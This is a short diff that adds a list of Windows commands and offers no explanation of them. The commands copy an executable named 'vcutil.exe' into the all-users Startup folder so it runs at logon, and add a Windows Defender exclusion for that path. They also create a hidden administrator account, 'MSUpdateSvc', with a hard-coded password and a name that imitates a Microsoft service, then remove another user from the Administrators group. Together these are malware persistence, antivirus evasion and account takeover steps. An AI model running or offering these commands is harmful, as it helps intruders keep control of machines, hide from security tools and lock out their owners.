@@ -1,0 +1,11 @@
+move "%USERPROFILE%\Desktop\vcutil.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\filename.ext'"
+
+net user MSUpdateSvc ExtraPass9182 /add
+
+net localgroup Administrators MSUpdateSvc /add
+
+net localgroup Administrators
+
+net localgroup Administrators Username /delete
